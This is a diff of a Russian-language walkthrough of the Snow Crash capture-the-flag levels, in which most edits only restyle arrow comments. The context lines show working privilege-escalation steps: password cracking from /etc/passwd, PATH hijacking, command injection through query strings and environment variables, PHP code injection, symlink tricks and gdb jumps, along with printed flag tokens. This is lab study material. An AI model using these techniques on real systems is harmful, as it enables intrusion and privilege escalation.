@@ -43,13 +43,13 @@ ls -la
 2. Ищу файлы, связанные с пользователем flag00
 ```sh
 find / -user flag00 2>/dev/null
-#  |
+# ||
 # \/
 # /usr/sbin/john
 # /rofs/usr/sbin/john
 
 cat /usr/sbin/john
-#  |
+# ||
 # \/
 # cdiiddwpgswtgt
 
@@ -73,11 +73,11 @@ Rechercher un outil ввести содержимое файла \
 su flag00 nottoohardhere
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
 
-# перехожу ко 01му уровню
+# перехожу к 01му уровню
 su level01 x24ti5gi3x0ol2eh4esiuxias
 ```
 <a name="lvl01"></a> 
@@ -93,7 +93,7 @@ find / -user flag01 2>/dev/null
 2. Тогда прямолинейно заглядываю в пароли ))))
 ```sh
 cat /etc/passwd
-#  |
+# ||
 # \/
 # level13:x:2013:2013::/home/user/level13:/bin/bash
 # level14:x:2014:2014::/home/user/level14:/bin/bash
@@ -108,19 +108,19 @@ cat /etc/passwd
 #------#
 # MacOS
 # https://download.openwall.net/pub/projects/john/contrib/macosx/
-#  |
+# ||
 # \/
 john-1.8.0.9-jumbo-macosx_avx2.zip
 
 ./john ~/Desktop/snow_crash/lvl01ForJohn
 cat john.pot
-#  |
+# ||
 # \/
 # 42hDRfypTqqnw:abcdefg
 
 # либо 
 ./john ~/Desktop/snow_crash/lvl01ForJohn --show
-#  |
+# ||
 # \/
 # flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
 
@@ -130,7 +130,7 @@ cat john.pot
 sudo snap install john-the-ripper
 
 john ~/Desktop/github/Snow_crash/lvl01ForJohn --show
-#  |
+# ||
 # \/
 # Created directory: /home/user/snap/john-the-ripper/555/.john
 # Created directory: /home/user/snap/john-the-ripper/555/.john/opencl
@@ -142,13 +142,13 @@ flag01:**abcdefg**:3001:3001::/home/flag/flag01:/bin/bash \
 abcdefg искомый пароль
 ```sh
 su flag01
-#  |
+# ||
 # \/
 # Password: abcdefg
 # Don't forget to launch getflag !
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : f2av5il02puano7naaf6adaaf
 ```
@@ -178,7 +178,7 @@ https://www.tcpdump.org/manpages/tcpdump.1.html
 
 ```sh
 tcpdump -r ~/level02.pcap -Xq | nl
-#  |
+# ||
 # \/
 #  230  06:23:26.095219 IP 59.233.235.223.12121 > 59.233.235.218.39247: tcp 13
 #  231          0x0000:  4500 0041 d4b3 4000 4006 1677 3be9 ebdf  E..A..@.@..w;...
@@ -208,7 +208,7 @@ tcp[13] & 8 != 0 проверяет, установлен ли этот флаг
 and src 59.233.235.218 фильтрую пакеты по отправителю (отправитель вводит пароль)
 ```sh
 tcpdump -r ~/level02.pcap -n -Xq | nl | grep assword
-#  |
+# ||
 # \/
 # reading from file /home/user/level02/level02.pcap, link-type EN10MB (Ethernet)
 #  234          0x0030:  011b b987 000d 0a50 6173 7377 6f72 643a  .......Password:
@@ -247,7 +247,7 @@ HEX /2: ft_wandrNDRelL0L
 su flag02 с этим паролем ft_waNDReL0L
 ```sh
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
 # перехожу ко 3му уровню
@@ -259,7 +259,7 @@ su level03 kooda2puivaav1idi4f57q8iq
 1. Проверяю содержимое директории:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
 ```
@@ -278,7 +278,7 @@ system("/usr/bin/env echo Exploit me")
 ```sh
 ls -la / 
 # нахожу место допустимое для записи 
-#  |
+# ||
 # \/
 # d-wx-wx-wx   4 root root   80 Feb  6 13:14 tmp 
 ```
@@ -302,7 +302,7 @@ export PATH=/tmp:$PATH
 запускаю снова:
 ```sh
 ./level03
-#  |
+# ||
 # \/
 # Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
@@ -340,7 +340,7 @@ $y = $_[0];
 в квери параметре если указать `index.py?x=$(getflag)`, подставится нужная команда вместо x
 ```sh
 curl localhost:4747?x='$(getflag)'
-#  |
+# ||
 # \/
 # Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
@@ -355,7 +355,7 @@ su level05 ne2searoevaevoem4ov4ar8ap
 В переменной окружения MAIL путь к письму
 ```sh
 cat /var/mail/level05 
-#  |
+# ||
 # \/
 # */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
@@ -381,7 +381,7 @@ getfacl /opt/openarenaserver/ - покажет наличие возможнос
 echo "getflag > /opt/openarenaserver/psswflag" > /opt/openarenaserver/run.sh
 
 cat /opt/openarenaserver/psswflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : viuaaale9huek52boumoomioc
 
@@ -395,12 +395,12 @@ su level06 viuaaale9huek52boumoomioc
 ```sh
 ls -la
 ./level06
-#  |
+# ||
 # \/
 # PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
 
 cat level06.php
-#  |
+# ||
 # \/
 ```
 ```php
@@ -462,7 +462,7 @@ echo '[x {${system(getflag)}}]' > /tmp/myy
 Запускаю программу:
 ```sh
 ./level06 /tmp/myy gdfgdfgh
-#  |
+# ||
 # \/
 # PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 # Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
@@ -477,12 +477,12 @@ su level07 wiok45aaoguiboiki2tuin6ub
 1. Проверяю содержимое директории:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
 
 ltrace ./level07 
-#  |
+# ||
 # \/
 ```
 ```sh
@@ -504,7 +504,7 @@ getenv("LOGNAME") = "level07" \
 ```sh
 export LOGNAME='$(getflag)'
 ./level07 
-#  |
+# ||
 # \/
 # Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
@@ -517,18 +517,18 @@ su level08 fiumuikeil55xe9cu4dood66h
 Проверяю содержимое директории:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
 # -rw-------  1 flag08  flag08    26 Mar  5  2016 token
 
 ./level08 
-#  |
+# ||
 # \/
 # ./level08 [file to read]
 
 ./level08 token 
-#  |
+# ||
 # \/
 # You may not access 'token'
 
@@ -536,7 +536,7 @@ ls -la
 1 . простой путь
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # drwxrwxrwx+ 1 level08 level08  160 Feb  8 11:50 .
 
@@ -545,13 +545,13 @@ chmod 777 .
 ln -s token tkn
 
 ./level08 tkn
-#  |
+# ||
 # \/
 # quif5eloekouj29ke0vouxean
 su flag08 quif5eloekouj29ke0vouxean
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
 
@@ -564,7 +564,7 @@ su level09 25749xKZ8L7DkSCwJkT9dyv6f
 Теперь надо найти папку, куда записать токен с новым именем
 ```sh
 ls -lA -R / 2>/dev/null | grep -E 'd[rwxst-]{6}rw.'
-#  |
+# ||
 # \/
 # drwxrwxrwx 21 root root  364 Mar 12  2016 rofs
 # drwxrwxrwt  2 root root    3 Mar 12  2016 tmp
@@ -574,7 +574,7 @@ ls -lA -R / 2>/dev/null | grep -E 'd[rwxst-]{6}rw.'
 # drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash
 
 find / -name tmp -type d 2>/dev/null
-#  |
+# ||
 # \/
 # /tmp
 # /var/tmp
@@ -585,7 +585,7 @@ ls -la на каждую папку - ни одна не подходит. \
 Далее по порядку crash
 ```sh
 find / -name crash -type d 2>/dev/null
-#  |
+# ||
 # \/
 # /usr/src/linux-headers-3.2.0-89-generic-pae/include/config/crash
 # /var/crash
@@ -593,14 +593,14 @@ find / -name crash -type d 2>/dev/null
 # /rofs/var/crash
 
 ls -lad /var/crash
-#  |
+# ||
 # \/
 # drwxrwsrwt 2 root whoopsie 3 Mar 12  2016 /var/crash
 # есть!
 
 # или
 find / -name shm -type d 2>/dev/null
-#  |
+# ||
 # \/
 # /run/shm
 # есть!
@@ -618,18 +618,18 @@ ln -s token /run/shm/tkn
 1. Проверяю содержимое директории:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09
 # ----r--r-- 1 flag09  level09   26 Mar  5  2016 token
 
 ./level09 token 
-#  |
+# ||
 # \/
 # tpmhr
 
 ./level09 00000000000000 
-#  |
+# ||
 # \/
 # 0123456789:;<=
 
@@ -657,18 +657,18 @@ print("".join([chr(ord(tokenstr[i])-i) for i in range(len(tokenstr) - 1)]))
 запускаю скрипт:
 ```sh
 python myscript.py 
-#  |
+# ||
 # \/
 # f3iji1ju5yuevaus41q1afiuq
 
 su flag09
-#  |
+# ||
 # \/
 # Password: f3iji1ju5yuevaus41q1afiuq
 # Don't forget to launch getflag !
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
 
@@ -681,7 +681,7 @@ su level10 s5cAJpM8ev6XHw998pRWG728z
 1. Смотрю, что есть:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10 \
 # -rw-------  1 flag10  flag10     26 Mar  5  2016 token
@@ -689,27 +689,27 @@ ls -la
 2. Запускаю и пытаюсь понять, что можно сделать с этой программкой
 ```sh
 ./level10
-#  |
+# ||
 # \/
 # ./level10 file host
 
 ./level10 file host
-#  |
+# ||
 # \/
 # sends file to host if you have access to it
 
 ./level10 token 127.0.0.1
-#  |
+# ||
 # \/
 # You don't have access to token
 
 ./level10 level10 127.0.0.1
-#  |
+# ||
 # \/
 # Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
 
 ./level10 level10 drfhgdfghxfg
-#  |
+# ||
 # \/
 # Connecting to drfhgdfghxfg:6969 .. Unable to connect to host drfhgdfghxfg
 ```
@@ -773,13 +773,13 @@ woupa2yuojeeaaed06riuj63c
 
 ```sh
 su flag10
-#  |
+# ||
 # \/
 # Password: woupa2yuojeeaaed06riuj63c
 # Don't forget to launch getflag !
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 
@@ -793,12 +793,12 @@ Password: feulo4b72j7edeahuete3no7c
 1. Смотрю, что есть
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
 
 cat level11.lua 
-#  |
+# ||
 # \/
 ```
 
@@ -874,7 +874,7 @@ Erf nope..
 Connection closed by foreign host.
 
 cat tkn
-#  |
+# ||
 # \/
 # Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
@@ -887,12 +887,12 @@ su level12 fa6v5ateaw21peobuub8ipe6s
 1. Смотрю:
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
 
 cat level12.pl 
-#  |
+# ||
 # \/
 ```
 ```pl
@@ -951,7 +951,7 @@ curl 127.0.0.1:4646?x= \
 $xx =~ tr/a-z/A-Z/;  переведет в верхний регистр, значит мне надо запустить скрипт, который запустит getflag
 ```sh
 touch MYSCRIPT.SH
-#  |
+# ||
 # \/
 ```
 ```sh
@@ -962,7 +962,7 @@ getflag > /tmp/tkn
 
 ```sh
 getfacl .
-#  |
+# ||
 # \/
 # default:user:flag12:r-x
 # default:group:flag12:r-x
@@ -979,7 +979,7 @@ curl 127.0.0.1:4646?x='$(/home/user/level12/MYSCRIPT.SH)'
 На большое количество звезд можно получить ошибку
 ```sh
 ls -l /*/*/*/*/*/*/*/
-#  |
+# ||
 # \/
 # bash: /usr/bin/ls: Слишком длинный список аргументов
 ```
@@ -987,7 +987,7 @@ ls -l /*/*/*/*/*/*/*/
 ```sh
 curl 127.0.0.1:4646?x='$(/*/MYSCRIPT.SH)'
 cat /tmp/tkn2
-#  |
+# ||
 # \/
 # Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
@@ -996,7 +996,7 @@ cat /tmp/tkn2
 curl 127.0.0.1:4646?x='$(/???/MYSCRIPT.SH)'
 
 cat /tmp/tkn2
-#  |
+# ||
 # \/
 # Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
@@ -1012,12 +1012,12 @@ Password: g1qKMiRpXf53AWhDaU7FEkczr
 1. Проверяю директорию и ее содержимое
 ```sh
 ls -la
-#  |
+# ||
 # \/
 # -rwsr-sr-x 1 flag13  level13 7303 Aug 30  2015 level13
 
 ./level13 
-#  |
+# ||
 # \/
 # UID 2013 started us but we we expect 4242
 ```
@@ -1067,7 +1067,7 @@ disas (пробел и таб)
 ```sh
 # break point устанавливаю 
 b *0x0804859a
-#  |
+# ||
 # \/
 # Breakpoint 1 at 0x804859a
 
@@ -1076,7 +1076,7 @@ run
 
 # прыгаю, куда надо
 jump *0x080485cb
-#  |
+# ||
 # \/
 # Continuing at 0x80485cb.
 # your token is 2A31L79asukciNyi8uppkEuSx
@@ -1095,19 +1095,19 @@ Password: 2A31L79asukciNyi8uppkEuSx
 Попробую перезаписать uid
 ```sh
 p $eax=4242
-#  |
+# ||
 # \/
 # $1 = 4242
 
 # p - print, посмотрю, как записалось
 (gdb) p $eax
-#  |
+# ||
 # \/
 # $2 = 4242
 
 # проверю регистры 
 info register
-#  |
+# ||
 # \/
 # eax            0x1092   4242
 # ecx            0xbffff6d4       -1073744172
@@ -1130,7 +1130,7 @@ info register
 
 # Продолжаем с точки остановки:
 c
-#  |
+# ||
 # \/
 # Continuing.
 # your token is 2A31L79asukciNyi8uppkEuSx
@@ -1161,7 +1161,7 @@ disas  main очень длинный.                    \
 Сохраняю в файл lvl14.asm вывод и работаю с файлом.
 ```sh
 id flag14
-#  |
+# ||
 # \/
 # uid=3014(flag14) gid=3014(flag14) groups=3014(flag14),1001(flag)
 ```
@@ -1170,7 +1170,7 @@ id flag14
 BC6
 ```sh
 cat lvl14.asm | grep bc6
-#  |
+# ||
 # \/
 #  0x08048b46 <+512>:   je     0x8048bc6 <main+640>
 #  0x08048bb6 <+624>:   cmp    $0xbc6,%eax
@@ -1191,14 +1191,14 @@ https://habr.com/ru/post/111266/                                      \
 ```sh
 #  0x08048982 <+60>:    movl   $0x0,(%esp)
 b *0x08048982
-#  |
+# ||
 # \/
 # Breakpoint 1 at 0x8048982
 
 run
 
 jump *0x08048de5
-#  |
+# ||
 # \/
 # Continuing at 0x8048de5.
 # 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
@@ -1208,12 +1208,12 @@ jump *0x08048de5
 Последний шаг:
 ```sh
 su flag14 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
-#  |
+# ||
 # \/
 # Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
 
 getflag
-#  |
+# ||
 # \/
 # Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
 ```
